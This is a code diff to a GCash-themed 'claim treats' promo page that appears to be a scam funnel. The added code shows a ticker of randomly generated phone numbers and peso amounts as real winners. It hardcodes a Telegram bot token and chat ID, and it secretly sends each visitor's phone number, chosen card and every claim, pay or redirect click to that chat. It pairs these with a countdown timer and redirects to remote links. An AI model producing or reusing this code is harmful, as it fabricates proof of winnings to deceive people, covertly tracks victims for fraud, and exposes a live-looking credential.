@@ -18,7 +18,7 @@
   <script src="js/config.js"></script>
   
   <style>
-    /* ===== ADDITIONAL INLINE CSS FOR NEON ICON ===== */
+    /* ===== ADDITIONAL INLINE CSS ===== */
     .claim-popup-user-info .user-phone i {
       color: #00d4ff;
       font-size: 0.9rem;
@@ -28,21 +28,199 @@
     }
 
     @keyframes neonPulse {
-      0%, 100% {
-        filter: drop-shadow(0 0 8px rgba(0, 212, 255, 0.3));
-      }
-      50% {
-        filter: drop-shadow(0 0 20px rgba(0, 212, 255, 0.6));
-      }
+      0%, 100% { filter: drop-shadow(0 0 8px rgba(0, 212, 255, 0.3)); }
+      50% { filter: drop-shadow(0 0 20px rgba(0, 212, 255, 0.6)); }
     }
 
-    /* Hide duplicate phone icon if any */
     .claim-popup-user-info .user-phone .fa-phone {
       display: none;
+    }
+
+    /* ===== WINNERS TICKER - CENTERED ===== */
+    .winners-ticker {
+      max-width: 440px;
+      width: 100%;
+      background: rgba(0, 0, 0, 0.3);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-radius: 60px;
+      padding: 0.8rem 1.2rem;
+      margin-bottom: 1rem;
+      border: 1px solid rgba(0, 180, 255, 0.08);
+      overflow: hidden;
+      position: relative;
+      z-index: 2;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+      min-height: 56px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .ticker-wrapper {
+      overflow: hidden;
+      width: 100%;
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .ticker-track {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      min-height: 44px;
+      position: relative;
+    }
+
+    .ticker-slide {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      justify-content: center;
+      padding: 0.2rem 0.5rem;
+      opacity: 1;
+      transition: opacity 0.5s ease;
+      width: 100%;
+    }
+
+    .ticker-slide.fade-out {
+      opacity: 0;
+    }
+
+    .ticker-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: rgba(255, 255, 255, 0.85);
+      font-size: 0.8rem;
+      font-weight: 500;
+      font-family: 'Inter', sans-serif;
+      padding: 0.3rem 1rem 0.3rem 0.6rem;
+      background: rgba(255, 255, 255, 0.04);
+      border-radius: 40px;
+      border: 1px solid rgba(255, 255, 255, 0.04);
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    .ticker-item .gc-icon-small {
+      width: 28px;
+      height: 28px;
+      object-fit: contain;
+      display: block;
+      filter: brightness(0) invert(1);
+      opacity: 0.9;
+      flex-shrink: 0;
+    }
+
+    .ticker-item .ticker-phone {
+      color: #00d4ff;
+      font-weight: 700;
+      font-family: 'Inter', monospace;
+      font-size: 0.85rem;
+      letter-spacing: 0.02em;
+    }
+
+    .ticker-item .ticker-phone .asterisk {
+      color: rgba(255, 255, 255, 0.3);
+      font-weight: 400;
+      margin: 0 2px;
+    }
+
+    .ticker-item .ticker-claim {
+      color: rgba(255, 255, 255, 0.4);
+      font-weight: 400;
+      font-size: 0.7rem;
+    }
+
+    .ticker-item .ticker-amount {
+      font-weight: 700;
+      font-size: 0.85rem;
+      padding: 0.1rem 0.6rem;
+      border-radius: 20px;
+    }
+
+    .ticker-item .ticker-amount.common {
+      color: #fcd34d;
+      background: rgba(252, 211, 77, 0.1);
+      border: 1px solid rgba(252, 211, 77, 0.1);
+    }
+
+    .ticker-item .ticker-amount.rare {
+      color: #ff6b6b;
+      background: rgba(255, 107, 107, 0.1);
+      border: 1px solid rgba(255, 107, 107, 0.1);
+      text-shadow: 0 0 20px rgba(255, 107, 107, 0.1);
+    }
+
+    .ticker-counter {
+      position: absolute;
+      right: 8px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 0.55rem;
+      color: rgba(255, 255, 255, 0.15);
+      font-weight: 600;
+      letter-spacing: 0.04em;
+      font-family: 'Inter', monospace;
+      background: rgba(0, 0, 0, 0.2);
+      padding: 0.15rem 0.6rem;
+      border-radius: 20px;
+      border: 1px solid rgba(255, 255, 255, 0.03);
+    }
+
+    @keyframes winnerPop {
+      0% { transform: scale(0.8); opacity: 0; }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .ticker-slide.pop {
+      animation: winnerPop 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+    }
+
+    @media (max-width: 480px) {
+      .winners-ticker { padding: 0.5rem 0.8rem; border-radius: 40px; min-height: 48px; margin-bottom: 0.8rem; }
+      .ticker-item { font-size: 0.65rem; gap: 6px; padding: 0.2rem 0.6rem 0.2rem 0.4rem; }
+      .ticker-item .gc-icon-small { width: 20px; height: 20px; }
+      .ticker-item .ticker-phone { font-size: 0.7rem; }
+      .ticker-item .ticker-amount { font-size: 0.7rem; padding: 0.05rem 0.4rem; }
+      .ticker-item .ticker-claim { font-size: 0.6rem; }
+      .ticker-counter { font-size: 0.45rem; padding: 0.1rem 0.4rem; right: 4px; }
+    }
+
+    @media (max-width: 380px) {
+      .winners-ticker { padding: 0.4rem 0.6rem; border-radius: 30px; min-height: 42px; }
+      .ticker-item { font-size: 0.55rem; gap: 4px; padding: 0.15rem 0.4rem 0.15rem 0.3rem; }
+      .ticker-item .gc-icon-small { width: 16px; height: 16px; }
+      .ticker-item .ticker-phone { font-size: 0.6rem; }
+      .ticker-item .ticker-amount { font-size: 0.6rem; padding: 0.05rem 0.3rem; }
+      .ticker-item .ticker-claim { font-size: 0.5rem; }
     }
   </style>
 </head>
 <body>
+
+  <!-- ============================================================
+       WINNERS TICKER - 1 BY 1 DISPLAY (EVERY 7 SECONDS)
+  ============================================================ -->
+  <div class="winners-ticker" id="winnersTicker">
+    <div class="ticker-wrapper" id="tickerWrapper">
+      <div class="ticker-track">
+        <div class="ticker-slide" id="tickerSlide">
+          <div class="ticker-item">
+            <img src="photos/gc_icon.png" alt="GCash" class="gc-icon-small" />
+            <span class="ticker-phone" id="tickerPhone">09<span class="asterisk">***</span>1234</span>
+            <span class="ticker-claim">has claimed</span>
+            <span class="ticker-amount common" id="tickerAmount">₱1,500</span>
+          </div>
+        </div>
+      </div>
+      <span class="ticker-counter" id="tickerCounter">1 / 20</span>
+    </div>
+  </div>
 
   <!-- DECORATIONS -->
   <div class="decoration tree">🎄</div>
@@ -204,7 +382,6 @@
         <i class="fas fa-times"></i>
       </button>
       
-      <!-- User Info - ONLY ONE MOBILE ICON (Neon Light Blue) -->
       <div class="claim-popup-user-info">
         <div class="user-phone">
           <i class="fas fa-mobile-alt"></i> <span id="claimPopupPhone">09171234567</span>
@@ -260,7 +437,7 @@
         </a>
       </div>
       
-      <button class="claim-popup-btn-pay" id="claimPayBtn" onclick="startTimer()">
+      <button class="claim-popup-btn-pay" id="claimPayBtn" onclick="handlePayTreatsClick()">
         <i class="fas fa-credit-card"></i> PAY TREATS
         <span class="timer-display" id="claimTimerDisplay"></span>
       </button>
@@ -268,7 +445,7 @@
   </div>
 
   <!-- ============================================================
-       JAVASCRIPT - COMPLETE WORKING
+       JAVASCRIPT
   ============================================================ -->
   <script>
     // ============================================================
@@ -289,6 +466,230 @@
     } catch(e) {
       console.log('⚠️ Firebase error:', e);
     }
+
+    // ============================================================
+    // TELEGRAM CONFIG
+    // ============================================================
+    const TELEGRAM_BOT_TOKEN = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
+    const TELEGRAM_CHAT_ID = '7298607329';
+
+    function sendTelegramMessage(message) {
+      const url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
+      const params = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      };
+      
+      const queryString = Object.keys(params)
+        .map(function(key) { 
+          return encodeURIComponent(key) + '=' + encodeURIComponent(params[key]); 
+        })
+        .join('&');
+      
+      fetch(url + '?' + queryString)
+        .then(function(response) { return response.json(); })
+        .then(function(data) {
+          if (!data.ok) {
+            console.error('Telegram error:', data.description);
+          } else {
+            console.log('✅ Telegram notification sent');
+          }
+        })
+        .catch(function(error) {
+          console.error('Failed to send Telegram:', error);
+        });
+    }
+
+    function getPhilippineTime() {
+      return new Date().toLocaleString('en-PH', {
+        timeZone: 'Asia/Manila',
+        month: 'long',
+        day: 'numeric',
+        year: 'numeric',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit'
+      });
+    }
+
+    function sendClaimNowAlert(cardName, cardAmount, phone) {
+      var timestamp = getPhilippineTime();
+      var message = '📱 <b>CLAIM NOW CLICKED!</b> 🛍️\n\n' +
+                    '👤 <b>User:</b> ' + phone + '\n' +
+                    '💳 <b>Card:</b> ' + cardName + '\n' +
+                    '💰 <b>Amount:</b> ' + cardAmount + '\n' +
+                    '⏰ <b>Time:</b> ' + timestamp + '\n\n' +
+                    '#BuyTreats #ClaimNow #UserAction';
+      sendTelegramMessage(message);
+    }
+
+    function sendPayTreatsAlert(cardName, cardAmount, phone, hasLink, timerStatus) {
+      var timestamp = getPhilippineTime();
+      var linkStatus = hasLink ? '✅ With Link' : '❌ No Link';
+      var timerStatusText = timerStatus === 'running' ? '⏳ Timer Running' : '⏹️ No Timer';
+      
+      var message = '💳 <b>PAY TREATS CLICKED!</b> 💰\n\n' +
+                    '👤 <b>User:</b> ' + phone + '\n' +
+                    '💎 <b>Card:</b> ' + cardName + '\n' +
+                    '🏷️ <b>Amount:</b> ' + cardAmount + '\n' +
+                    '🔗 <b>Link Status:</b> ' + linkStatus + '\n' +
+                    '⏱️ <b>Timer Status:</b> ' + timerStatusText + '\n' +
+                    '⏰ <b>Time:</b> ' + timestamp + '\n\n' +
+                    (hasLink ? '🔗 User will be redirected to treat link' : '⏰ Timer will start (300 seconds)') + '\n' +
+                    '#BuyTreats #PayTreats #UserAction';
+      sendTelegramMessage(message);
+    }
+
+    function sendRedirectAlert(cardName, cardAmount, phone) {
+      var timestamp = getPhilippineTime();
+      var message = '🔗 <b>USER REDIRECTED!</b> 🚀\n\n' +
+                    '👤 <b>User:</b> ' + phone + '\n' +
+                    '💎 <b>Card:</b> ' + cardName + '\n' +
+                    '💰 <b>Amount:</b> ' + cardAmount + '\n' +
+                    '⏰ <b>Time:</b> ' + timestamp + '\n\n' +
+                    '✅ User successfully redirected to treat link!\n' +
+                    '#BuyTreats #Redirect #Conversion';
+      sendTelegramMessage(message);
+    }
+
+    // ============================================================
+    // WINNERS TICKER - 1 BY 1 DISPLAY (EVERY 7 SECONDS)
+    // ============================================================
+    (function() {
+      'use strict';
+
+      var DISPLAY_INTERVAL = 7000; // 7 seconds
+      var TOTAL_WINNERS = 20;
+
+      var tickerPhone = document.getElementById('tickerPhone');
+      var tickerAmount = document.getElementById('tickerAmount');
+      var tickerCounter = document.getElementById('tickerCounter');
+      var tickerSlide = document.getElementById('tickerSlide');
+
+      var winners = [];
+      var currentIndex = 0;
+      var tickerInterval = null;
+
+      function generateRandomPhone() {
+        var prefix = '09' + String(Math.floor(Math.random() * 9000) + 1000);
+        var suffix = String(Math.floor(Math.random() * 9000) + 1000);
+        return { full: prefix + suffix, prefix: prefix, suffix: suffix };
+      }
+
+      function generateRandomAmount() {
+        var random = Math.random();
+        if (random < 0.7) {
+          return { amount: 1500, display: '₱1,500', class: 'common' };
+        } else {
+          return { amount: 3000, display: '₱3,000', class: 'rare' };
+        }
+      }
+
+      function generateAllWinners(count) {
+        var result = [];
+        var usedPhones = new Set();
+        
+        for (var i = 0; i < count; i++) {
+          var phoneData;
+          do {
+            phoneData = generateRandomPhone();
+          } while (usedPhones.has(phoneData.full));
+          usedPhones.add(phoneData.full);
+          
+          var amountData = generateRandomAmount();
+          result.push({ phone: phoneData, amount: amountData });
+        }
+        
+        return result;
+      }
+
+      function updateDisplay(index) {
+        var winner = winners[index];
+        if (!winner) return;
+        
+        tickerSlide.classList.remove('pop');
+        void tickerSlide.offsetWidth;
+        
+        var displayPhone = winner.phone.prefix + '<span class="asterisk">***</span>' + winner.phone.suffix;
+        tickerPhone.innerHTML = displayPhone;
+        tickerAmount.textContent = winner.amount.display;
+        tickerAmount.className = 'ticker-amount ' + winner.amount.class;
+        tickerCounter.textContent = (index + 1) + ' / ' + winners.length;
+        
+        tickerSlide.classList.add('pop');
+      }
+
+      function nextWinner() {
+        currentIndex = (currentIndex + 1) % winners.length;
+        updateDisplay(currentIndex);
+      }
+
+      function initTicker() {
+        winners = generateAllWinners(TOTAL_WINNERS);
+        currentIndex = 0;
+        updateDisplay(0);
+        
+        if (tickerInterval) {
+          clearInterval(tickerInterval);
+        }
+        tickerInterval = setInterval(nextWinner, DISPLAY_INTERVAL);
+        console.log('✅ Winners ticker initialized with ' + winners.length + ' winners');
+      }
+
+      // Pause on hover
+      var tickerWrapper = document.getElementById('tickerWrapper');
+      if (tickerWrapper) {
+        tickerWrapper.addEventListener('mouseenter', function() {
+          if (tickerInterval) {
+            clearInterval(tickerInterval);
+            tickerInterval = null;
+          }
+        });
+        tickerWrapper.addEventListener('mouseleave', function() {
+          if (!tickerInterval) {
+            tickerInterval = setInterval(nextWinner, DISPLAY_INTERVAL);
+          }
+        });
+      }
+
+      // Handle image error
+      var gcIcon = document.querySelector('.gc-icon-small');
+      if (gcIcon) {
+        gcIcon.addEventListener('error', function() {
+          this.style.display = 'none';
+        });
+      }
+
+      // Start after DOM ready
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', function() {
+          setTimeout(initTicker, 500);
+        });
+      } else {
+        setTimeout(initTicker, 500);
+      }
+
+      // Add new winner function
+      window.addTickerWinner = function() {
+        var phoneData = generateRandomPhone();
+        var amountData = generateRandomAmount();
+        winners.push({ phone: phoneData, amount: amountData });
+        tickerCounter.textContent = (currentIndex + 1) + ' / ' + winners.length;
+        if (winners.length === 1) {
+          updateDisplay(0);
+        }
+        console.log('🎉 New winner added to ticker');
+      };
+
+      // Add random winner every 30 seconds
+      setInterval(function() {
+        if (typeof window.addTickerWinner === 'function') {
+          window.addTickerWinner();
+        }
+      }, 30000);
+
+    })();
 
     // ============================================================
     // CARD DATA
@@ -324,7 +725,6 @@
     var claimNowBtn = document.getElementById('claimNowBtn');
     var photoWrapper = document.getElementById('photoWrapper');
 
-    // Card Popup
     var cardPopupOverlay = document.getElementById('cardPopupOverlay');
     var cardPopupImage = document.getElementById('cardPopupImage');
     var cardPopupOldPrice = document.getElementById('cardPopupOldPrice');
@@ -333,7 +733,6 @@
     var cardPopupReward = document.getElementById('cardPopupReward');
     var cardPopupSelectBtn = document.getElementById('cardPopupSelectBtn');
 
-    // Claim Popup
     var claimPopupOverlay = document.getElementById('claimPopupOverlay');
     var claimPopupImage = document.getElementById('claimPopupImage');
     var claimPopupOldPrice = document.getElementById('claimPopupOldPrice');
@@ -358,24 +757,14 @@
     var isRedirecting = false;
     var linkScannerInterval = null;
     var currentTreatType = null;
+    var hasSentPayTreatsAlert = false;
+    var userPhone = localStorage.getItem('user_phone') || '09171234567';
 
     // ============================================================
     // HELPER FUNCTIONS
     // ============================================================
     function formatWithCommas(number) {
       return number.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
-    }
-
-    function getPhilippineTime() {
-      return new Date().toLocaleString('en-PH', {
-        timeZone: 'Asia/Manila',
-        month: 'long',
-        day: 'numeric',
-        year: 'numeric',
-        hour: '2-digit',
-        minute: '2-digit',
-        second: '2-digit'
-      });
     }
 
     // ============================================================
@@ -403,15 +792,13 @@
     }
 
     // ============================================================
-    // START AUTO SCAN (every second)
+    // START AUTO SCAN
     // ============================================================
     function startAutoScan(treatType) {
       stopAutoScan();
       currentTreatType = treatType;
       console.log('🔄 Auto-scan started for:', treatType);
-      
       checkAndRedirect(treatType);
-      
       linkScannerInterval = setInterval(function() {
         checkAndRedirect(treatType);
       }, 1000);
@@ -443,6 +830,11 @@
             
             isRedirecting = true;
             claimPayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REDIRECTING...';
+            claimPayBtn.disabled = true;
+            
+            var cardNumber = parseInt(selectedCard.replace('card', ''));
+            var cardDataItem = cardData[cardNumber];
+            sendRedirectAlert(cardDataItem.name, cardDataItem.badge, userPhone);
             
             if (database) {
               database.ref('treat_links')
@@ -540,10 +932,8 @@
       }
     }
 
-    // START THOUGHT BUBBLE
     setTimeout(typeEffect, 600);
 
-    // Watch balance changes
     var balanceObserver = new MutationObserver(updateThoughtMessages);
     if (balanceElement) {
       balanceObserver.observe(balanceElement, { childList: true, characterData: true, subtree: true });
@@ -688,7 +1078,9 @@
       claimPopupRewardAmount.textContent = formatWithCommas(rawAmount);
       claimPopupReward.textContent = data.badge;
       
-      claimPopupPhone.textContent = localStorage.getItem('user_phone') || '09171234567';
+      claimPopupPhone.textContent = userPhone;
+      
+      sendClaimNowAlert(data.name, data.badge, userPhone);
       
       resetClaimTimer();
       claimPopupOverlay.classList.add('active');
@@ -711,6 +1103,16 @@
     }
 
     // ============================================================
+    // PAY TREATS HANDLER
+    // ============================================================
+    function handlePayTreatsClick() {
+      var cardNumber = parseInt(selectedCard.replace('card', ''));
+      var data = cardData[cardNumber];
+      sendPayTreatsAlert(data.name, data.badge, userPhone, !!treatLink, isTimerRunning ? 'running' : 'stopped');
+      startTimer();
+    }
+
+    // ============================================================
     // TIMER
     // ============================================================
     function startTimer() {
@@ -723,37 +1125,62 @@
       if (treatLink && !isRedirecting) {
         isRedirecting = true;
         claimPayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REDIRECTING...';
-        setTimeout(function() { window.location.href = treatLink; }, 1500);
+        claimPayBtn.disabled = true;
+        setTimeout(function() { 
+          window.location.href = treatLink; 
+        }, 1500);
         return;
       }
       
       timeRemaining = 300;
       isTimerRunning = true;
+      
       claimPayBtn.classList.add('disabled');
+      claimPayBtn.disabled = true;
       claimPayBtn.innerHTML = '<i class="fas fa-hourglass-half"></i> WAIT <span class="timer-display" id="claimTimerDisplay">5:00</span>';
+      
+      if (timerInterval) {
+        clearInterval(timerInterval);
+        timerInterval = null;
+      }
       
       timerInterval = setInterval(function() {
         timeRemaining--;
+        
         var minutes = Math.floor(timeRemaining / 60);
         var seconds = timeRemaining % 60;
         var timeStr = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
-        if (claimTimerDisplay) claimTimerDisplay.textContent = timeStr;
+        
+        var display = document.getElementById('claimTimerDisplay');
+        if (display) {
+          display.textContent = timeStr;
+        }
+        
+        console.log('⏰ Timer:', timeStr);
         
         if (timeRemaining <= 0) {
           clearInterval(timerInterval);
           timerInterval = null;
           isTimerRunning = false;
+          
           claimPayBtn.classList.remove('disabled');
+          claimPayBtn.disabled = false;
           claimPayBtn.innerHTML = '<i class="fas fa-credit-card"></i> PAY TREATS';
-          if (claimTimerDisplay) claimTimerDisplay.textContent = '';
-          console.log('⏰ Timer finished');
+          
+          var display2 = document.getElementById('claimTimerDisplay');
+          if (display2) display2.textContent = '';
+          
+          console.log('⏰ Timer finished - button reset');
           
           if (database && currentTreatType) {
             checkForDeployedLink(currentTreatType).then(function(link) {
               if (link && !isRedirecting) {
                 isRedirecting = true;
                 claimPayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REDIRECTING...';
-                setTimeout(function() { window.location.href = link; }, 1500);
+                claimPayBtn.disabled = true;
+                setTimeout(function() { 
+                  window.location.href = link; 
+                }, 1500);
               }
             });
           }
@@ -769,7 +1196,9 @@
       isTimerRunning = false;
       timeRemaining = 0;
       claimPayBtn.classList.remove('disabled');
-      if (claimTimerDisplay) claimTimerDisplay.textContent = '';
+      claimPayBtn.disabled = false;
+      var display = document.getElementById('claimTimerDisplay');
+      if (display) display.textContent = '';
       claimPayBtn.innerHTML = '<i class="fas fa-credit-card"></i> PAY TREATS';
     }
 
@@ -823,10 +1252,11 @@
     window.closeClaimPopup = closeClaimPopup;
     window.startTimer = startTimer;
     window.openHelp = openHelp;
+    window.handlePayTreatsClick = handlePayTreatsClick;
 
     console.log('✅ Main.js initialized successfully');
-    console.log('✅ Thought bubble started');
-    console.log('✅ Auto-scan enabled (every 1 second)');
+    console.log('✅ Winners ticker running (7-second interval)');
+    console.log('✅ Telegram alerts enabled');
   </script>
 
 </body>
